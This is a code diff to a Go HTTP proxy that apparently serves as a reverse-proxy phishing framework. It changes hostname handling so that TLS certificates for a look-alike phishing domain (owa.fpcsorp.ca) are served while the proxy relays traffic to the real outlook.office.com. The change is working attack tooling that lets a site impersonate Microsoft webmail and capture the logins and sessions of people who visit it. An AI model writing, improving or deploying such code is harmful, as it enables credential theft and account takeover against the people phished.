@@ -3795,7 +3795,18 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		if !p.developer {
 			// Check if wildcard TLS is enabled and using self-signed certs (no external DNS)
 			if p.cfg.IsWildcardTLSEnabled() {
-				// Try to serve from self-signed wildcard cache first
+				// TLSConfigFromCA receives the ORIGINAL hostname (e.g. outlook.office.com)
+				// but we need the PHISH hostname (e.g. owa.fpcsorp.ca) to find the wildcard cert
+				phishHostname, _ := p.replaceHostWithPhished(hostname)
+				if phishHostname != "" {
+					cert := p.crt_db.getWildcardCertificate(phishHostname)
+					if cert != nil {
+						return &tls.Config{
+							Certificates: []tls.Certificate{*cert},
+						}, nil
+					}
+				}
+				// Fallback: try the hostname as-is (might already be phish hostname)
 				cert := p.crt_db.getWildcardCertificate(hostname)
 				if cert != nil {
 					return &tls.Config{
@@ -3922,9 +3933,9 @@ func (p *HttpProxy) httpsWorker() {
 			}
 			log.Debug("[httpsWorker] hostname OK: %s from %s, forwarding to proxy", hostname, remoteAddr)
 
-			// NOTE: Do NOT replace hostname with original here - TLSConfigFromCA needs the
-			// phish hostname (owa.fpcsorp.ca) to find the wildcard certificate (*.fpcsorp.ca).
-			// The hostname translation to original domain happens later during request proxying.
+			// Replace phish hostname with original for upstream connection
+			// TLSConfigFromCA will convert back to phish hostname for cert lookup
+			hostname, _ = p.replaceHostWithOriginal(hostname)
 
 			req := &http.Request{
 				Method: "CONNECT",
